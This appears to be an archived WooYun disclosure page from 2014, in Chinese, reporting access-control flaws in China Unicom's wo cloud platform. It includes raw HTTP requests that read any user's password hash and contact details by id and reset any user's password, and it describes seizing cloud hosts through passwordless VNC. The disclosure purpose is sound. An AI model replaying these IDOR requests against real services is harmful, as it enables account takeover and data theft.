@@ -1,0 +1,260 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		中国联通某服务配置不当上千台服务器可被控制  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		中国联通某服务配置不当上千台服务器可被控制  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/超威蓝猫">超威蓝猫</a> 
+</li><li>提交时间：		2014-02-10 13:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-15：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-25：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-07：	细节向普通白帽子公开<br/>
+									2014-03-17：	细节向实习白帽子公开<br/>
+									2014-03-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">中国联通某服务配置不当 上千台服务器可被控制，几十G的带宽，几百G的内存，几千G的存储岌岌可危。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">上次找了个电信云平台的漏洞 http://wooyun.org/bugs/wooyun-2014-049646 这回我们来个联通的。<br />
+<br />
+<br />
+<br />
+http://www.wocloud.cn/<br />
+<br />
+我们打开联通 wo 云平台，注册一个新的账户。咦停止注册了? 我们按 F12 打开 Chrome 的调试工具。</p><p class="detail"><a href="../images/10122602153df773aeb7959aec82cc673f03edea.jpg" target="_blank"><img src="../images/10122602153df773aeb7959aec82cc673f03edea.jpg" alt="01.jpg" width="600"/></a></p><p class="detail">可以看到，注册的按钮只是加了个 disable 属性禁用了，我们把这个属性去掉，就可以成功提交表单注册了。</p><p class="detail"><a href="../images/10122952e23ccc43fb0cd36f8ced6f666ab4cfac.jpg" target="_blank"><img src="../images/10122952e23ccc43fb0cd36f8ced6f666ab4cfac.jpg" alt="02.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+我们登录注册好的帐号，进入个人中心的修改密码处 http://www.wocloud.cn/portal/jsp/user/changePwd.jsp?code=pwd<br />
+<br />
+通过抓包，我们发现了两处漏洞:<br />
+<br />
+1.读取任意账户信息，包括登录密码<br />
+<br />
+我们使用Burp抓包，<br />
+<br />
+</p><p class="detail"><a href="../images/10124743ebf51069ebd7ea8a407be86b0071330b.jpg" target="_blank"><img src="../images/10124743ebf51069ebd7ea8a407be86b0071330b.jpg" alt="03.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>POST /portal/pr/client?p=/user/describeUsersInfo HTTP/1.1<br />
+Host: www.wocloud.cn<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 6<br />
+Accept: application/json, text/javascript, */*; q=0.01<br />
+Origin: http://www.wocloud.cn<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36<br />
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br />
+DNT: 1<br />
+Referer: http://www.wocloud.cn/portal/jsp/user/changePwd.jsp?code=pwd<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6<br />
+Cookie: JSESSIONID=7A2764D84984D3E634A6B3E45FC7BD2A<br />
+<br />
+id=598</code></pre><p class='detail'><br />
+<br />
+(此处post的数据&quot;id&quot;为用户编号）<br />
+<br />
+</p><pre><code>HTTP/1.1 200 OK<br />
+Server: nginx<br />
+Date: Mon, 10 Feb 2014 04:38:11 GMT<br />
+Content-Type: application/json;charset=UTF-8<br />
+Content-Length: 436<br />
+Connection: keep-alive<br />
+<br />
+{&quot;data&quot;:[{&quot;name&quot;:&quot;crtest&quot;,&quot;id&quot;:598,&quot;state&quot;:4,&quot;comment&quot;:null,&quot;password&quot;:&quot;ece42545aeef94653dd1b04571e993a2&quot;,&quot;position&quot;:null,&quot;token&quot;:null,&quot;email&quot;:&quot;crtest@yopmail.com&quot;,&quot;account&quot;:&quot;crtest&quot;,&quot;phone&quot;:&quot;&quot;,&quot;mobile&quot;:&quot;13599052222&quot;,&quot;compId&quot;:0,&quot;roleId&quot;:1,&quot;checkCode&quot;:&quot;&quot;,&quot;compOrgCode&quot;:null,&quot;compAddress&quot;:null,&quot;compPhone&quot;:null,&quot;compFax&quot;:null,&quot;compEmail&quot;:null,&quot;postCode&quot;:null,&quot;deptId&quot;:1,&quot;approve&quot;:0,&quot;fax&quot;:null,&quot;compName&quot;:null}],&quot;code&quot;:&quot;0&quot;,&quot;msg&quot;:&quot;success&quot;}</code></pre><p class='detail'><br />
+<br />
+可以看到，返回的数据中包括md5加密过的密码(crtest01)，用户注册时的邮箱、手机号、姓名以及公司信息等。经测试可知，共有600多位用户。通过修改id，我们可以轻易得到任意用户的帐号、密码等隐私信息。<br />
+<br />
+</p><p class="detail"><a href="../images/10124806e2f7d8f22b9b406e9ea2aa548a80876d.jpg" target="_blank"><img src="../images/10124806e2f7d8f22b9b406e9ea2aa548a80876d.jpg" alt="04.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2.平行权限修改任意账户密码<br />
+<br />
+我们使用Burp抓包，<br />
+<br />
+</p><pre><code>POST /portal/pr/client?p=/user/modifyUser HTTP/1.1<br />
+Host: www.wocloud.cn<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 24<br />
+Accept: application/json, text/javascript, */*; q=0.01<br />
+Origin: http://www.wocloud.cn<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36<br />
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br />
+DNT: 1<br />
+Referer: http://www.wocloud.cn/portal/jsp/user/changePwd.jsp?code=pwd<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6<br />
+Cookie: JSESSIONID=7A2764D84984D3E634A6B3E45FC7BD2A<br />
+<br />
+id=598&amp;password=crtest01</code></pre><p class='detail'><br />
+<br />
+此处id对应待修改的用户的id。password则为新密码。<br />
+<br />
+</p><pre><code>HTTP/1.1 200 OK<br />
+Server: nginx<br />
+Date: Mon, 10 Feb 2014 04:48:21 GMT<br />
+Content-Type: application/json;charset=UTF-8<br />
+Content-Length: 76<br />
+Connection: keep-alive<br />
+<br />
+{&quot;data&quot;:{&quot;data&quot;:null,&quot;code&quot;:&quot;0&quot;,&quot;msg&quot;:&quot;success&quot;},&quot;code&quot;:&quot;0&quot;,&quot;msg&quot;:&quot;success&quot;}</code></pre><p class='detail'><br />
+<br />
+经测试可知，通过修改此处的id，我们可以轻易修改任意账户的登录密码。<br />
+<br />
+这里我们将id为1的帐号密码修改为wooyun进行测试。<br />
+<br />
+</p><p class="detail"><a href="../images/101252330f1e1c2f64046ce245471604351f4a03.jpg" target="_blank"><img src="../images/101252330f1e1c2f64046ce245471604351f4a03.jpg" alt="05.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+通过第一个漏洞，我们可以得到id为1的用户的登录名为china_unicom1212，我们使用新密码wooyun可以成功登录。<br />
+<br />
+</p><p class="detail"><a href="../images/101256146a35f6f33f27bf441449ed9ca0c7c503.jpg" target="_blank"><img src="../images/101256146a35f6f33f27bf441449ed9ca0c7c503.jpg" alt="06.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/10125626063e50a45a0b7563a0ba8912e3902e9a.jpg" target="_blank"><img src="../images/10125626063e50a45a0b7563a0ba8912e3902e9a.jpg" alt="07.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+我们对id从1到8的账户进行了测试。可以发现由于云主机的控制面板提供了无需密码的VNC控制，且大部分用户的云主机没有修改默认密码</p><p class="detail"><a href="../images/101300535e0ec824ee1139246a52b6e45a477a49.jpg" target="_blank"><img src="../images/101300535e0ec824ee1139246a52b6e45a477a49.jpg" alt="08.jpg" width="600"/></a></p><p class="detail">，导致可以直接控制云主机，相当于直接获得云主机的最高级shell。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">经估算，每个账户上平均有2台云主机、50G的系统盘+40G的弹性块存储(云主机附加的硬盘)、2个公网IP、20M独享带宽。600个账户的总量是惊人的，倘若被利用进行恶意DDoS攻击、挂流量矿石、搭建非法站点等，后果十分严重，这里不再赘述。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们更专业。<br />
+<br />
+<br />
+<br />
+(不知道有没有什么礼物相送呢?) </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/超威蓝猫" title="超威蓝猫">超威蓝猫</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050565" title="中国联通某服务配置不当上千台服务器可被控制">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：16 </p>
+													<p class="detail">确认时间：2014-02-15 09:45</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="50565";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
